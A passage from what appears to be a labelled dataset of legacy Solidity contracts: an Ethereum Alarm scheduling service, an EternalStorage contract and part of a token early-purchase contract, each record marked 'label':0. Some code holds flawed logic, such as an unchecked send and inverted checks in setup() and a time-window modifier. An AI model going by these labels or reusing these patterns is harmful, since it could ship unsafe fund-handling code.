Compute the scalar (0 - 200) for the fee.\r\r\n            uint feeScalar = getCallFeeScalar(call.baseGasPrice, call.gasPrice);\r\r\n\r\r\n            \/\/ Log how much gas this call used.  EXTRA_CALL_GAS is a fixed\r\r\n            \/\/ amount that represents the gas usage of the commands that\r\r\n            \/\/ happen after this line.\r\r\n            call.gasUsed = (gasBefore - msg.gas + EXTRA_CALL_GAS);\r\r\n            call.gasCost = call.gasUsed * call.gasPrice;\r\r\n\r\r\n            \/\/ Now we need to pay the caller as well as keep fee.\r\r\n            \/\/ callerPayout -> call cost + 1%\r\r\n            \/\/ fee -> 1% of callerPayout\r\r\n            call.payout = call.gasCost * feeScalar * 101 \/ 10000;\r\r\n            call.fee = call.gasCost * feeScalar \/ 10000;\r\r\n\r\r\n            AccountingLib.deductFunds(self.gasBank, call.scheduledBy, call.payout + call.fee);\r\r\n\r\r\n            AccountingLib.addFunds(self.gasBank, msgSender, call.payout);\r\r\n            AccountingLib.addFunds(self.gasBank, owner, call.fee);\r\r\n    }\r\r\n\r\r\n    function getCallMaxCost(CallDatabase storage self, bytes32 callKey) constant returns (uint) {\r\r\n            \/*\r\r\n             *  tx.gasprice * block.gaslimit\r\r\n             *  \r\r\n             *\/\r\r\n            \/\/ call cost + 2%\r\r\n            var call = self.calls[callKey];\r\r\n\r\r\n            uint gasCost = tx.gasprice * block.gaslimit;\r\r\n            uint feeScalar = getCallFeeScalar(call.baseGasPrice, tx.gasprice);\r\r\n\r\r\n            return gasCost * feeScalar * 102 \/ 10000;\r\r\n    }\r\r\n\r\r\n    function getCallFeeScalar(uint baseGasPrice, uint gasPrice) constant returns (uint) {\r\r\n            \/*\r\r\n             *  Return a number between 0 - 200 to scale the fee based on\r\r\n             *  the gas price set for the calling transaction as compared\r\r\n             *  to the gas price of the scheduling transaction.\r\r\n             *\r\r\n             *  - number approaches zero as the transaction gas price goes\r\r\n             *  above the gas price recorded when the call was scheduled.\r\r\n             *\r\r\n             *  - the number approaches 200 as the transaction gas price\r\r\n             *  drops under the price recorded when the call was scheduled.\r\r\n             *\r\r\n             *  This encourages lower gas costs as the lower the gas price\r\r\n             *  for the executing transaction, the higher the payout to the\r\r\n             *  caller.\r\r\n             *\/\r\r\n            if (gasPrice > baseGasPrice) {\r\r\n                    return 100 * baseGasPrice \/ gasPrice;\r\r\n            }\r\r\n            else {\r\r\n                    return 200 - 100 * baseGasPrice \/ (2 * baseGasPrice - gasPrice);\r\r\n            }\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     *  Call Scheduling API\r\r\n     *\/\r\r\n\r\r\n    \/\/ The result of `sha()` so that we can validate that people aren&#39;t\r\r\n    \/\/ looking up call data that failed to register.\r\r\n    bytes32 constant emptyDataHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\r\n\r\r\n    function computeCallKey(address scheduledBy, address contractAddress, bytes4 abiSignature, bytes32 dataHash, uint targetBlock, uint8 gracePeriod, uint nonce) constant returns (bytes32) {\r\r\n            return sha3(scheduledBy, contractAddress, abiSignature, dataHash, targetBlock, gracePeriod, nonce);\r\r\n    }\r\r\n\r\r\n    \/\/ Ten minutes into the future.\r\r\n    uint constant MAX_BLOCKS_IN_FUTURE = 40;\r\r\n\r\r\n    event _CallScheduled(bytes32 indexed callKey);\r\r\n    function CallScheduled(bytes32 callKey) public {\r\r\n        _CallScheduled(callKey);\r\r\n    }\r\r\n    event _CallRejected(bytes32 indexed callKey, bytes15 reason);\r\r\n    function CallRejected(bytes32 callKey, bytes15 reason) public {\r\r\n        _CallRejected(callKey, reason);\r\r\n    }\r\r\n\r\r\n    function getCallWindowSize() public returns (uint) {\r\r\n        return CALL_WINDOW_SIZE;\r\r\n    }\r\r\n\r\r\n    function getMinimumGracePeriod() public returns (uint) {\r\r\n        return 4 * CALL_WINDOW_SIZE;\r\r\n    }\r\r\n\r\r\n    function scheduleCall(CallDatabase storage self, address schedulerAddress, address contractAddress, bytes4 abiSignature, bytes32 dataHash, uint targetBlock, uint8 gracePeriod, uint nonce) public returns (bytes15) {\r\r\n            \/*\r\r\n             * Primary API for scheduling a call.  Prior to calling this\r\r\n             * the data should already have been registered through the\r\r\n             * `registerData` API.\r\r\n             *\/\r\r\n            bytes32 callKey = computeCallKey(schedulerAddress, contractAddress, abiSignature, dataHash, targetBlock, gracePeriod, nonce);\r\r\n\r\r\n            if (dataHash != emptyDataHash && self.data_registry[dataHash].length == 0) {\r\r\n                    \/\/ Don&#39;t allow registering calls if the data hash has\r\r\n                    \/\/ not actually been registered.  The only exception is\r\r\n                    \/\/ the *emptyDataHash*.\r\r\n                    return \"NO_DATA\";\r\r\n            }\r\r\n\r\r\n            if (targetBlock < block.number + MAX_BLOCKS_IN_FUTURE) {\r\r\n                    \/\/ Don&#39;t allow scheduling further than\r\r\n                    \/\/ MAX_BLOCKS_IN_FUTURE\r\r\n                    return \"TOO_SOON\";\r\r\n            }\r\r\n            Call storage call = self.calls[callKey];\r\r\n\r\r\n            if (call.contractAddress != 0x0) {\r\r\n                    return \"DUPLICATE\";\r\r\n            }\r\r\n\r\r\n            if (gracePeriod < getMinimumGracePeriod()) {\r\r\n                    return \"GRACE_TOO_SHORT\";\r\r\n            }\r\r\n\r\r\n            self.lastCallKey = callKey;\r\r\n\r\r\n            call.contractAddress = contractAddress;\r\r\n            call.scheduledBy = schedulerAddress;\r\r\n            call.nonce = nonce;\r\r\n            call.abiSignature = abiSignature;\r\r\n            call.dataHash = dataHash;\r\r\n            call.targetBlock = targetBlock;\r\r\n            call.gracePeriod = gracePeriod;\r\r\n            call.baseGasPrice = tx.gasprice;\r\r\n\r\r\n            \/\/ Put the call into the grove index.\r\r\n            GroveLib.insert(self.callIndex, callKey, int(call.targetBlock));\r\r\n\r\r\n            return 0x0;\r\r\n    }\r\r\n\r\r\n    event _CallCancelled(bytes32 indexed callKey);\r\r\n    function CallCancelled(bytes32 callKey) public {\r\r\n        _CallCancelled(callKey);\r\r\n    }\r\r\n\r\r\n    \/\/ Two minutes\r\r\n    uint constant MIN_CANCEL_WINDOW = 8;\r\r\n\r\r\n    function cancelCall(CallDatabase storage self, bytes32 callKey, address msgSender) public returns (bool) {\r\r\n            Call storage call = self.calls[callKey];\r\r\n            if (call.scheduledBy != msgSender) {\r\r\n                    \/\/ Nobody but the scheduler can cancel a call.\r\r\n                    return false;\r\r\n            }\r\r\n            if (call.wasCalled) {\r\r\n                    \/\/ No need to cancel a call that already was executed.\r\r\n                    return false;\r\r\n            }\r\r\n            if (call.targetBlock - MIN_CANCEL_WINDOW <= block.number) {\r\r\n                    \/\/ Call cannot be cancelled this close to execution.\r\r\n                    return false;\r\r\n            }\r\r\n            call.isCancelled = true;\r\r\n            return true;\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\/*\r\r\n *  Ethereum Alarm Service\r\r\n *  Version 0.4.0\r\r\n *\r\r\n *  address: 0x07307d0b136a79bac718f43388aed706389c4588\r\r\n *\/\r\r\ncontract Alarm {\r\r\n        \/*\r\r\n         *  Constructor\r\r\n         *\r\r\n         *  - sets up relays\r\r\n         *  - configures the caller pool.\r\r\n         *\/\r\r\n        function Alarm() {\r\r\n                callDatabase.unauthorizedRelay = new Relay();\r\r\n                callDatabase.authorizedRelay = new Relay();\r\r\n\r\r\n                callDatabase.callerPool.freezePeriod = 80;\r\r\n                callDatabase.callerPool.rotationDelay = 80;\r\r\n                callDatabase.callerPool.overlapSize = 256;\r\r\n        }\r\r\n\r\r\n        ScheduledCallLib.CallDatabase callDatabase;\r\r\n\r\r\n        \/\/ The author (Piper Merriam) address.\r\r\n        address constant owner = 0xd3cda913deb6f67967b99d67acdfa1712c293601;\r\r\n\r\r\n        \/*\r\r\n         *  Account Management API\r\r\n         *\/\r\r\n        function getAccountBalance(address accountAddress) constant public returns (uint) {\r\r\n                return callDatabase.gasBank.accountBalances[accountAddress];\r\r\n        }\r\r\n\r\r\n        function deposit() public {\r\r\n                deposit(msg.sender);\r\r\n        }\r\r\n\r\r\n        function deposit(address accountAddress) public {\r\r\n                \/*\r\r\n                 *  Public API for depositing funds in a specified account.\r\r\n                 *\/\r\r\n                AccountingLib.deposit(callDatabase.gasBank, accountAddress, msg.value);\r\r\n                AccountingLib.Deposit(msg.sender, accountAddress, msg.value);\r\r\n        }\r\r\n\r\r\n        function withdraw(uint value) public {\r\r\n                \/*\r\r\n                 *  Public API for withdrawing funds.\r\r\n                 *\/\r\r\n                if (AccountingLib.withdraw(callDatabase.gasBank, msg.sender, value)) {\r\r\n                        AccountingLib.Withdrawal(msg.sender, value);\r\r\n                }\r\r\n                else {\r\r\n                        AccountingLib.InsufficientFunds(msg.sender, value, callDatabase.gasBank.accountBalances[msg.sender]);\r\r\n                }\r\r\n        }\r\r\n\r\r\n        function() {\r\r\n                \/*\r\r\n                 *  Fallback function that allows depositing funds just by\r\r\n                 *  sending a transaction.\r\r\n                 *\/\r\r\n                deposit(msg.sender);\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Scheduling Authorization API\r\r\n         *\/\r\r\n        function unauthorizedAddress() constant returns (address) {\r\r\n                return address(callDatabase.unauthorizedRelay);\r\r\n        }\r\r\n\r\r\n        function authorizedAddress() constant returns (address) {\r\r\n                return address(callDatabase.authorizedRelay);\r\r\n        }\r\r\n\r\r\n        function addAuthorization(address schedulerAddress) public {\r\r\n                ScheduledCallLib.addAuthorization(callDatabase, schedulerAddress, msg.sender);\r\r\n        }\r\r\n\r\r\n        function removeAuthorization(address schedulerAddress) public {\r\r\n                callDatabase.accountAuthorizations[sha3(schedulerAddress, msg.sender)] = false;\r\r\n        }\r\r\n\r\r\n        function checkAuthorization(address schedulerAddress, address contractAddress) constant returns (bool) {\r\r\n                return callDatabase.accountAuthorizations[sha3(schedulerAddress, contractAddress)];\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Caller bonding\r\r\n         *\/\r\r\n        function getMinimumBond() constant returns (uint) {\r\r\n                return ScheduledCallLib.getMinimumBond();\r\r\n        }\r\r\n\r\r\n        function depositBond() public {\r\r\n                ResourcePoolLib.addToBond(callDatabase.callerPool, msg.sender, msg.value);\r\r\n        }\r\r\n\r\r\n        function withdrawBond(uint value) public {\r\r\n                ResourcePoolLib.withdrawBond(callDatabase.callerPool, msg.sender, value, getMinimumBond());\r\r\n        }\r\r\n\r\r\n        function getBondBalance() constant returns (uint) {\r\r\n                return getBondBalance(msg.sender);\r\r\n        }\r\r\n\r\r\n        function getBondBalance(address callerAddress) constant returns (uint) {\r\r\n                return callDatabase.callerPool.bonds[callerAddress];\r\r\n        }\r\r\n\r\r\n\r\r\n        \/*\r\r\n         *  Pool Management\r\r\n         *\/\r\r\n        function getGenerationForCall(bytes32 callKey) constant returns (uint) {\r\r\n                var call = callDatabase.calls[callKey];\r\r\n                return ResourcePoolLib.getGenerationForWindow(callDatabase.callerPool, call.targetBlock, call.targetBlock + call.gracePeriod);\r\r\n        }\r\r\n\r\r\n        function getGenerationSize(uint generationId) constant returns (uint) {\r\r\n                return callDatabase.callerPool.generations[generationId].members.length;\r\r\n        }\r\r\n\r\r\n        function getGenerationStartAt(uint generationId) constant returns (uint) {\r\r\n                return callDatabase.callerPool.generations[generationId].startAt;\r\r\n        }\r\r\n\r\r\n        function getGenerationEndAt(uint generationId) constant returns (uint) {\r\r\n                return callDatabase.callerPool.generations[generationId].endAt;\r\r\n        }\r\r\n\r\r\n        function getCurrentGenerationId() constant returns (uint) {\r\r\n                return ResourcePoolLib.getCurrentGenerationId(callDatabase.callerPool);\r\r\n        }\r\r\n\r\r\n        function getNextGenerationId() constant returns (uint) {\r\r\n                return ResourcePoolLib.getNextGenerationId(callDatabase.callerPool);\r\r\n        }\r\r\n\r\r\n        function isInPool() constant returns (bool) {\r\r\n                return ResourcePoolLib.isInPool(callDatabase.callerPool, msg.sender);\r\r\n        }\r\r\n\r\r\n        function isInPool(address callerAddress) constant returns (bool) {\r\r\n                return ResourcePoolLib.isInPool(callDatabase.callerPool, callerAddress);\r\r\n        }\r\r\n\r\r\n        function isInGeneration(uint generationId) constant returns (bool) {\r\r\n                return isInGeneration(msg.sender, generationId);\r\r\n        }\r\r\n\r\r\n        function isInGeneration(address callerAddress, uint generationId) constant returns (bool) {\r\r\n                return ResourcePoolLib.isInGeneration(callDatabase.callerPool, callerAddress, generationId);\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Pool Meta information\r\r\n         *\/\r\r\n        function getPoolFreezePeriod() constant returns (uint) {\r\r\n                return callDatabase.callerPool.freezePeriod;\r\r\n        }\r\r\n\r\r\n        function getPoolOverlapSize() constant returns (uint) {\r\r\n                return callDatabase.callerPool.overlapSize;\r\r\n        }\r\r\n\r\r\n        function getPoolRotationDelay() constant returns (uint) {\r\r\n                return callDatabase.callerPool.rotationDelay;\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Pool Membership\r\r\n         *\/\r\r\n        function canEnterPool() constant returns (bool) {\r\r\n                return ResourcePoolLib.canEnterPool(callDatabase.callerPool, msg.sender, getMinimumBond());\r\r\n        }\r\r\n\r\r\n        function canEnterPool(address callerAddress) constant returns (bool) {\r\r\n                return ResourcePoolLib.canEnterPool(callDatabase.callerPool, callerAddress, getMinimumBond());\r\r\n        }\r\r\n\r\r\n        function canExitPool() constant returns (bool) {\r\r\n                return ResourcePoolLib.canExitPool(callDatabase.callerPool, msg.sender);\r\r\n        }\r\r\n\r\r\n        function canExitPool(address callerAddress) constant returns (bool) {\r\r\n                return ResourcePoolLib.canExitPool(callDatabase.callerPool, callerAddress);\r\r\n        }\r\r\n\r\r\n        function enterPool() public {\r\r\n                uint generationId = ResourcePoolLib.enterPool(callDatabase.callerPool, msg.sender, getMinimumBond());\r\r\n                ResourcePoolLib.AddedToGeneration(msg.sender, generationId);\r\r\n        }\r\r\n\r\r\n        function exitPool() public {\r\r\n                uint generationId = ResourcePoolLib.exitPool(callDatabase.callerPool, msg.sender);\r\r\n                ResourcePoolLib.RemovedFromGeneration(msg.sender, generationId);\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Call Information API\r\r\n         *\/\r\r\n\r\r\n        function getLastCallKey() constant returns (bytes32) {\r\r\n                return callDatabase.lastCallKey;\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Getter methods for `Call` information\r\r\n         *\/\r\r\n        function getCallContractAddress(bytes32 callKey) constant returns (address) {\r\r\n                return ScheduledCallLib.getCallContractAddress(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallScheduledBy(bytes32 callKey) constant returns (address) {\r\r\n                return ScheduledCallLib.getCallScheduledBy(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallCalledAtBlock(bytes32 callKey) constant returns (uint) {\r\r\n                return ScheduledCallLib.getCallCalledAtBlock(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallGracePeriod(bytes32 callKey) constant returns (uint) {\r\r\n                return ScheduledCallLib.getCallGracePeriod(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallTargetBlock(bytes32 callKey) constant returns (uint) {\r\r\n                return ScheduledCallLib.getCallTargetBlock(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallBaseGasPrice(bytes32 callKey) constant returns (uint) {\r\r\n                return ScheduledCallLib.getCallBaseGasPrice(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallGasPrice(bytes32 callKey) constant returns (uint) {\r\r\n                return ScheduledCallLib.getCallGasPrice(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallGasUsed(bytes32 callKey) constant returns (uint) {\r\r\n                return ScheduledCallLib.getCallGasUsed(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallABISignature(bytes32 callKey) constant returns (bytes4) {\r\r\n                return ScheduledCallLib.getCallABISignature(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function checkIfCalled(bytes32 callKey) constant returns (bool) {\r\r\n                return ScheduledCallLib.checkIfCalled(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function checkIfSuccess(bytes32 callKey) constant returns (bool) {\r\r\n                return ScheduledCallLib.checkIfSuccess(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function checkIfCancelled(bytes32 callKey) constant returns (bool) {\r\r\n                return ScheduledCallLib.checkIfCancelled(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallDataHash(bytes32 callKey) constant returns (bytes32) {\r\r\n                return ScheduledCallLib.getCallDataHash(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallPayout(bytes32 callKey) constant returns (uint) {\r\r\n                return ScheduledCallLib.getCallPayout(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallFee(bytes32 callKey) constant returns (uint) {\r\r\n                return ScheduledCallLib.getCallFee(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallMaxCost(bytes32 callKey) constant returns (uint) {\r\r\n                return ScheduledCallLib.getCallMaxCost(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getCallData(bytes32 callKey) constant returns (bytes) {\r\r\n                return callDatabase.data_registry[callDatabase.calls[callKey].dataHash];\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Data registration API\r\r\n         *\/\r\r\n        function registerData() public {\r\r\n                ScheduledCallLib.registerData(callDatabase, msg.data);\r\r\n                ScheduledCallLib.DataRegistered(callDatabase.lastDataHash);\r\r\n        }\r\r\n\r\r\n        function getLastDataHash() constant returns (bytes32) {\r\r\n                return callDatabase.lastDataHash;\r\r\n        }\r\r\n\r\r\n        function getLastDataLength() constant returns (uint) {\r\r\n                return callDatabase.lastDataLength;\r\r\n        }\r\r\n\r\r\n        function getLastData() constant returns (bytes) {\r\r\n                return callDatabase.lastData;\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Call execution API\r\r\n         *\/\r\r\n        function doCall(bytes32 callKey) public {\r\r\n                ScheduledCallLib.doCall(callDatabase, callKey, msg.sender);\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Call Scheduling API\r\r\n         *\/\r\r\n        function getMinimumGracePeriod() constant returns (uint) {\r\r\n                return ScheduledCallLib.getMinimumGracePeriod();\r\r\n        }\r\r\n\r\r\n        function scheduleCall(address contractAddress, bytes4 abiSignature, bytes32 dataHash, uint targetBlock) public {\r\r\n                \/*\r\r\n                 *  Schedule call with gracePeriod defaulted to 255 and nonce\r\r\n                 *  defaulted to 0.\r\r\n                 *\/\r\r\n                scheduleCall(contractAddress, abiSignature, dataHash, targetBlock, 255, 0);\r\r\n        }\r\r\n\r\r\n        function scheduleCall(address contractAddress, bytes4 abiSignature, bytes32 dataHash, uint targetBlock, uint8 gracePeriod) public {\r\r\n                \/*\r\r\n                 *  Schedule call with nonce defaulted to 0.\r\r\n                 *\/\r\r\n                scheduleCall(contractAddress, abiSignature, dataHash, targetBlock, gracePeriod, 0);\r\r\n        }\r\r\n\r\r\n        function scheduleCall(address contractAddress, bytes4 abiSignature, bytes32 dataHash, uint targetBlock, uint8 gracePeriod, uint nonce) public {\r\r\n                \/*\r\r\n                 * Primary API for scheduling a call.  Prior to calling this\r\r\n                 * the data should already have been registered through the\r\r\n                 * `registerData` API.\r\r\n                 *\/\r\r\n                bytes15 reason = ScheduledCallLib.scheduleCall(callDatabase, msg.sender, contractAddress, abiSignature, dataHash, targetBlock, gracePeriod, nonce);\r\r\n                bytes32 callKey = ScheduledCallLib.computeCallKey(msg.sender, contractAddress, abiSignature, dataHash, targetBlock, gracePeriod, nonce);\r\r\n\r\r\n                if (reason != 0x0) {\r\r\n                        ScheduledCallLib.CallRejected(callKey, reason);\r\r\n                }\r\r\n                else {\r\r\n                        ScheduledCallLib.CallScheduled(callKey);\r\r\n                }\r\r\n        }\r\r\n\r\r\n        function cancelCall(bytes32 callKey) public {\r\r\n                if (ScheduledCallLib.cancelCall(callDatabase, callKey, address(msg.sender))) {\r\r\n                        ScheduledCallLib.CallCancelled(callKey);\r\r\n                }\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Next Call API\r\r\n         *\/\r\r\n        function getCallWindowSize() constant returns (uint) {\r\r\n                return ScheduledCallLib.getCallWindowSize();\r\r\n        }\r\r\n\r\r\n        function getGenerationIdForCall(bytes32 callKey) constant returns (uint) {\r\r\n                return ScheduledCallLib.getGenerationIdForCall(callDatabase, callKey);\r\r\n        }\r\r\n\r\r\n        function getDesignatedCaller(bytes32 callKey, uint blockNumber) constant returns (address) {\r\r\n                return ScheduledCallLib.getDesignatedCaller(callDatabase, callKey, blockNumber);\r\r\n        }\r\r\n\r\r\n        function getNextCall(uint blockNumber) constant returns (bytes32) {\r\r\n                return GroveLib.query(callDatabase.callIndex, \">=\", int(blockNumber));\r\r\n        }\r\r\n\r\r\n        function getNextCallSibling(bytes32 callKey) constant returns (bytes32) {\r\r\n                return GroveLib.getNextNode(callDatabase.callIndex, callKey);\r\r\n        }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\n\r\r\n\r\r\ncontract Ownable {\r\r\n\r\r\n    address public owner;\r\r\n    address public acceptableAddress;\r\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\r\n\r\r\n    function Ownable() public {\r\r\n        owner = msg.sender;\r\r\n        acceptableAddress = msg.sender;\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner() {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier onlyAcceptable() {\r\r\n        require(msg.sender == acceptableAddress);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function transferOwnership(address newOwner) public onlyOwner {\r\r\n        require(newOwner != address(0));\r\r\n        OwnershipTransferred(owner, newOwner);\r\r\n        owner = newOwner;\r\r\n    }\r\r\n\r\r\n    function transferAcceptable(address newAcceptable) public onlyOwner {\r\r\n        require(newAcceptable != address(0));\r\r\n        OwnershipTransferred(acceptableAddress, newAcceptable);\r\r\n        acceptableAddress = newAcceptable;\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\ncontract EternalStorage is Ownable {\r\r\n\r\r\n    function () public payable {\r\r\n        require(msg.sender == acceptableAddress || msg.sender == owner);\r\r\n    }\r\r\n\r\r\n    mapping(bytes32 => uint) public uintStorage;\r\r\n\r\r\n    function getUInt(bytes32 record) public view returns (uint) {\r\r\n        return uintStorage[record];\r\r\n    }\r\r\n\r\r\n    function setUInt(bytes32 record, uint value) public onlyAcceptable {\r\r\n        uintStorage[record] = value;\r\r\n    }\r\r\n\r\r\n    mapping(bytes32 => string) public stringStorage;\r\r\n\r\r\n    function getString(bytes32 record) public view returns (string) {\r\r\n        return stringStorage[record];\r\r\n    }\r\r\n\r\r\n    function setString(bytes32 record, string value) public onlyAcceptable {\r\r\n        stringStorage[record] = value;\r\r\n    }\r\r\n\r\r\n    mapping(bytes32 => address) public addressStorage;\r\r\n\r\r\n    function getAdd(bytes32 record) public view returns (address) {\r\r\n        return addressStorage[record];\r\r\n    }\r\r\n\r\r\n    function setAdd(bytes32 record, address value) public onlyAcceptable {\r\r\n        addressStorage[record] = value;\r\r\n    }\r\r\n\r\r\n    mapping(bytes32 => bytes) public bytesStorage;\r\r\n\r\r\n    function getBytes(bytes32 record) public view returns (bytes) {\r\r\n        return bytesStorage[record];\r\r\n    }\r\r\n\r\r\n    function setBytes(bytes32 record, bytes value) public onlyAcceptable {\r\r\n        bytesStorage[record] = value;\r\r\n    }\r\r\n\r\r\n    mapping(bytes32 => bytes32) public bytes32Storage;\r\r\n\r\r\n    function getBytes32(bytes32 record) public view returns (bytes32) {\r\r\n        return bytes32Storage[record];\r\r\n    }\r\r\n\r\r\n    function setBytes32(bytes32 record, bytes32 value) public onlyAcceptable {\r\r\n        bytes32Storage[record] = value;\r\r\n    }\r\r\n\r\r\n    mapping(bytes32 => bool) public booleanStorage;\r\r\n\r\r\n    function getBool(bytes32 record) public view returns (bool) {\r\r\n        return booleanStorage[record];\r\r\n    }\r\r\n\r\r\n    function setBool(bytes32 record, bool value) public  onlyAcceptable {\r\r\n        booleanStorage[record] = value;\r\r\n    }\r\r\n\r\r\n    mapping(bytes32 => int) public intStorage;\r\r\n\r\r\n    function getInt(bytes32 record) public view returns (int) {\r\r\n        return intStorage[record];\r\r\n    }\r\r\n\r\r\n    function setInt(bytes32 record, int value) public onlyAcceptable {\r\r\n        intStorage[record] = value;\r\r\n    }\r\r\n\r\r\n    function getBalance() public constant returns (uint) {\r\r\n        return this.balance;\r\r\n    }\r\r\n\r\r\n    function withdraw(address beneficiary) public onlyAcceptable {\r\r\n        uint balance = getUInt(keccak256(beneficiary, \"balance\"));\r\r\n        setUInt(keccak256(beneficiary, \"balance\"), 0);\r\r\n        beneficiary.transfer(balance);\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.7;\r\r\n\r\r\n\/\/\/ @title Private EarlyPurchase contract - Keep track of purchased amount by Early Purchasers\r\r\n\/\/\/ Project by SynchroLife Team (https:\/\/synchrolife.org)\r\r\n\/\/\/ This smart contract developed by Starbase - Token funding & payment Platform for innovative projects <support[at]starbase.co>\r\r\n\/\/\/ 1504008000  = Starting\uff1a8\/29 12:00GMT\r\r\n\/\/\/ 1504785599 = Ending: 9\/7 11:59GMT\r\r\n\/\/\/ now (uint): current block timestamp (alias for block.timestamp)\r\r\n\r\r\ncontract SYCPrivateEarlyPurchase {\r\r\n    \/*\r\r\n     *  Properties\r\r\n     *\/\r\r\n    string public constant PURCHASE_AMOUNT_UNIT = &#39;ETH&#39;;    \/\/ Ether\r\r\n    uint public constant WEI_MINIMUM_PURCHASE = 10 * 10 ** 18;\r\r\n    uint public constant WEI_MAXIMUM_EARLYPURCHASE = 7000 * 10 ** 18;\r\r\n    uint public constant STARTING_TIME = 1504008000;\r\r\n    uint public constant ENDING_TIME = 1504785599;\r\r\n    address public owner;\r\r\n    EarlyPurchase[] public earlyPurchases;\r\r\n    uint public earlyPurchaseClosedAt;\r\r\n    uint public totalEarlyPurchaseRaised;\r\r\n    address public sycCrowdsale;\r\r\n\r\r\n\r\r\n    \/*\r\r\n     *  Types\r\r\n     *\/\r\r\n    struct EarlyPurchase {\r\r\n        address purchaser;\r\r\n        uint amount;        \/\/ Amount in Wei( = 1\/ 10^18 Ether)\r\r\n        uint purchasedAt;   \/\/ timestamp\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     *  Modifiers\r\r\n     *\/\r\r\n    modifier onlyOwner() {\r\r\n        if (msg.sender != owner) {\r\r\n            throw;\r\r\n        }\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier onlyEarlyPurchaseTerm() {\r\r\n        if (earlyPurchaseClosedAt > 0 && now >= STARTING_TIME && now <= ENDING_TIME) {\r\r\n            throw;\r\r\n        }\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Contract constructor function\r\r\n    function SYCPrivateEarlyPurchase() {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     *  Contract functions\r\r\n     *\/\r\r\n    \/\/\/ @dev Returns early purchased amount by purchaser&#39;s address\r\r\n    \/\/\/ @param purchaser Purchaser address\r\r\n    function purchasedAmountBy(address purchaser)\r\r\n        external\r\r\n        constant\r\r\n        returns (uint amount)\r\r\n    {\r\r\n        for (uint i; i < earlyPurchases.length; i++) {\r\r\n            if (earlyPurchases[i].purchaser == purchaser) {\r\r\n                amount += earlyPurchases[i].amount;\r\r\n            }\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Setup function sets external contracts&#39; addresses.\r\r\n    \/\/\/ @param _sycCrowdsale SYC token crowdsale address.\r\r\n    function setup(address _sycCrowdsale)\r\r\n        external\r\r\n        onlyOwner\r\r\n        returns (bool)\r\r\n    {\r\r\n        if (address(_sycCrowdsale) == 0) {\r\r\n            sycCrowdsale = _sycCrowdsale;\r\r\n            return true;\r\r\n        }\r\r\n        return false;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Returns number of early purchases\r\r\n    function numberOfEarlyPurchases()\r\r\n        external\r\r\n        constant\r\r\n        returns (uint)\r\r\n    {\r\r\n        return earlyPurchases.length;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Append an early purchase log\r\r\n    \/\/\/ @param purchaser Purchaser address\r\r\n    \/\/\/ @param amount Purchase amount\r\r\n    \/\/\/ @param purchasedAt Timestamp of purchased date\r\r\n    function appendEarlyPurchase(address purchaser, uint amount, uint purchasedAt)\r\r\n        internal\r\r\n        onlyEarlyPurchaseTerm\r\r\n        returns (bool)\r\r\n    {\r\r\n        if (purchasedAt == 0 || purchasedAt > now) {\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        if(totalEarlyPurchaseRaised + amount >= WEI_MAXIMUM_EARLYPURCHASE){\r\r\n           purchaser.send(totalEarlyPurchaseRaised + amount - WEI_MAXIMUM_EARLYPURCHASE);\r\r\n           earlyPurchases.push(EarlyPurchase(purchaser, WEI_MAXIMUM_EARLYPURCHASE - totalEarlyPurchaseRaised, purchasedAt));\r\r\n           totalEarlyPurchaseRaised += WEI_MAXIMUM_EARLYPURCHASE - totalEarlyPurchaseRaised;\r\r\n        }\r\r\n        else{\r\r\n           earlyPurchases.push(EarlyPurchase(purchaser, amount, purchasedAt));\r\r\n           totalEarlyPurchaseRaised += amount;\r\r\n        }\r\r\n\r\r\n        if(totalEarlyPurchaseRaised >= WEI_MAXIMUM_EARLYPURCHASE || now >= ENDING_TIME){\r\r\n            earlyPurchaseClosedAt = now;\r\r\n        }\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Close early 